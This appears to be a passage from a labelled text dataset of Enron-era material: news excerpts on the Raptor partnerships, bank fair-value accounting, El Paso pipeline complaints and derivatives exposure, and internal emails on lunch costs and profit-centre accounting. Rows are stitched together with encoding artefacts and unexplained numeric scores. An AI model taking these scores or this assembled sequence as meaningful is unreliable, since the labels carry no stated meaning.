It is a tale of how accounting rules can be abused and insiders enriched.The report traces the delicate machinery that was used by Enron's accountan=ts. There appears to have been, at least for a time, a tortured interpretat=ion of accounting rules that could be used to justify the hiding of $1 bill=ion in losses.=20But that smokescreen would have been completely unsuccessful had auditors f=rom Arthur Andersen forced the company to disclose what was happening, as t=hey should have done. Those disclosures would have made it clear that there= was no economic rationale for the transactions, and thus no reason to thin=k that Enron had earned nearly as much money as it said it did.=20Over 15 months, from the beginning of the third quarter of 2000 through the= third quarter of 2001, Enron reported pretax profits of $1.5 billion. Had =Enron not used the Raptor artifices, the figure would have been 72 percent =lower: $429 million.=20The accounting rationale was that the risks of some truly bad investments h=ad been transferred from Enron to the Raptors, which were created in conjun=ction with partnerships run by Andrew S. Fastow, then Enron's chief financi=al officer.=20In fact, as the report makes clear, there was no real transfer of risk, and= Enron eventually had to shoulder the losses. But there was a large transfe=r of wealth to the Fastow partnerships, which were guaranteed huge profits =while taking no risks. Those transactions helped provide $30 million for Mr=. Fastow and millions for other Enron insiders.=20When it became clear that the Raptor enterprises were failing, Enron desper=ately restructured them, first at the end of 2000 and again three months la=ter. Those reorganizations, which the committee denounces in the strongest =terms, allowed the truth about Enron to stay largely hidden for many months= -- a period when top Enron officials sold large quantities of stock.=20''The creation, and especially the subsequent restructuring, of the Raptors= was perceived by many within Enron as a triumph of accounting ingenuity by= a group of innovative accountants,'' the committee report stated.

Tom, I probably should have explained what my problems are, and why it took me so long to get this to you.  Daniel is the person in charge of the lunches, and he has not had an opportunity to prepare the monthly spreadsheets for August and September, which show the total amounts per day, and how much each cost center is charged.  He's come up with a percentage, according to how many total people he orders for, then according to how many people are in each group, and he charges each cost center accordingly.  I've attached the 2 worksheets that he's provided me, which are for June and July, however there were fewer people in our group because since then he has added Brian Redmond and his group to our budget.  Daniel is working on preparing the spreadsheets for August and September.  I've told Ina that I'm needing them for a project for you, so I'm sure that they will be ready soon.  

I thought that I could just look at what's been charged to our cost center each month, but it was too difficult to figure out which invoices were from which lunch because they don't always hit the cost center the month during or after they were invoiced.  They are also sometimes charged on a credit card and then billed in a huge lump sum.  

I've simply made a spreadsheet showing selected restaurants and the average price of what we've been charged for June and July, and then I've shown what it will cost for 15 people to eat if we order it separately.  I've included tips and delivery charges, since we're billed for those as well.

The planshave been drawn up by the Joint Working Group, a body made up mainly ofaccounting standard-setters from the world's biggest economies. Bankers saythe results would lead to dramatic swings in the value of balance sheetassets that would often be meaningless and potentially damaging.It is certainly the case that the existing accounting rules often fail toreflect the impact of changes in interest rates or credit risks on bankearnings. Fair value accounting would force banks to adjust their accountsin the light of rises and falls in the values of all financial instruments.The result would be greater volatility in profits but proponents of thechange say it would give investors a truer picture of corporate health.Not so, say the banks. While fair value accounting is appropriate fortrading activities, it would not reflect the real business of makinglong-term loans to customers, which are largely held to maturity andtherefore rarely traded. Banks manage loan portfolios to make a stableinterest margin over the terms of the loans - not on the profits determinedeach year in relation to the interest rate at the time.",0.0,0.0,0.8,0.2

nominating volumes far in excess of their actual needs, and thus receive disproportionate volumes in the
pro-rata allocation scheme"" that El Paso uses, Oneok said.

Given that the related complaints deal with the same issue, Pacific Gas and Electric Co., Enron Corp.
and El Paso asked FERC to consolidate the cases. The cases should be addressed in one hearing where
""numerous allegations of contested fact"" could be investigated, El Paso submitted.

But neither shipper group is right, the pipeline maintained. It insisted that it adheres to the letter of its
contracts, tariff and two settlements to meet obligations to customers. Because unanticipated growth in
full-requirements demand has caused use of the capacity allocation procedures, El Paso would like to
establish a new systemwide allocation methodology in the order 637 proceeding, it told FERC.

""In anticipation that this escalating usage under the FR contracts will come under commission
scrutiny, the [EOC] shippers apparently chose to make a pre-emptive strike,"" El Paso said. FERC
should consider whether there is a ""reasonably proportionate limitation implied"" in El Paso's FR
contracts, the pipeline continued. Full-requirements shippers cannot demand more and more volumes
without paying for it, El Paso held.

""It is ludicrous for the [EOC] shippers to suggest that it is economically justifiable for [El Paso] to
construct expensive mainline facilities, costing hundreds of millions of dollars, to serve ever-increasing FR
loads at [EL Paso's] commodity rates,"" El Paso argued.

Besides, the commission has no authority to force a pipeline to expand under the circumstances at
hand, El Paso continued. Under NGA section 7(a), FERC's ability to order a physical connection to a
pipeline is limited to service for local distribution, El Paso noted. Any decision about other pipeline
facilities must be left to stockholders and directors of the companies, it concluded.",0.0,0.0,0.7,0.2

it appears that some Enron employees used dummy accounts and rigged valuation methodologies to create false profit-and-loss entries for the derivatives,1,"Banned From Trading Spraos estimates that as of Sept. 30, Enron owed $18.7billion on derivatives trades that went sour, though he said thatdoesn't take into account the collateral Enron probably posted toback up the trades. The European Energy Exchange today banned Enron from tradingits products, while Australian regulators barred the company'sfinance unit, Enron Australia Pty, from trading electricityfutures because its funding wasn't assured. U.S. Senate and House committees will investigate Enron'sdecline and consider new regulations for electricity and natural-gas trading. The Securities and Exchange Commission is alsoexamining the company. Enron had $201 billion worth of derivatives on oil, gas andelectricity at the end of last year, Swaps Monitor has reported.That's measuring the notional amount, the face value of thesecurities on which the derivatives are based. `Quantifying It' ``Everyone will be looking at their exposure, whether they'vegot collateral, and quantifying it,'' said Robert G. Pickel, chiefexecutive officer of the International Swaps and DerivativesAssociation. ISDA, a New York-based trade association representing morethan 550 companies that trade derivatives, designed the legalcontracts typically used in derivatives transactions. Pickel saidthose contracts are designed to address such situations. ``There are two potential issues relating to ISDAdocumentation, as a result of the situation regarding Enron,''Pickel said. The first involves companies that have enteredderivatives trades with Enron using ISDA's standard contract,known as the Master Agreement. The second concerns banks that haveprovided credit protection on Enron in the form of a credit-default swap, also using ISDA documents. Credit-default swaps work like insurance on a company's bondsor loans. They pay out if there's a bankruptcy, default, debtrestructuring or similar occurrence, known as a credit event. ``If there's a bankruptcy filing there's no question it wouldbe a credit event,'' Pickel said. `Can't Tell' Enron's U.K. units are in administration, which has triggeredwhat lawyers define as a credit event, said Simon Firth, head ofthe credit derivatives practice at Linklaters & Alliance, which isacting for PriceWaterhouseCoopers, the accountant for Enron'sEuropean arm. ``The documents are fairly robust, and we've been throughissues before,'' Firth said. He said that while ``each time thedocumentation gets strengthened, you can't tell what happens untilyou look at the individual cases.'' Enron owes almost two dozen energy companies about $700million. J.P. Morgan, the bank that advised Enron in the failedmerger with Dynegy, said it was owed $500 million for unsecuredloans. Canadian Imperial Bank of Commerce was owed $215 million inloans and credit derivatives.",0.0,0.3,0.9,0.2

Effective with March flow, each desks for Central and East will record to its own profit center in SAP (the wellhead desks and Texas were done in Feb.'s g/l). According to Gas Acct., they will calculate UA for each of the profit centers (19 in total). As we discussed, VM does not have the appropriate Unify reports or manpower to support this level of accounting at this time and for this month will continue to tie UA4 out as we have in the past using our same reports - Gas Acct. will have to sum their side of the UA4 calc. to match us. With the foresight of eventually going to profit center level accouting and reporting, there will need to be significant changes to our current back end systems and processes to handle this lower level of reporting. I believe the flash is already being done at the different profit centers, but all the downstream groups are still performing their analysis at a more consolidated level. There were discussions in the meeting that OA would not go to this lower level, but I am of the opinion that we all need to be consistent in our analysis and reporting across the organization - so if this is the path we take, then everyone's process will need to be able to handle this level of detail. Of course, no decisions were made in our meeting, and as I stated, for now, VM's process will remain unchanged for this month. Please let me know if you want to discuss further.
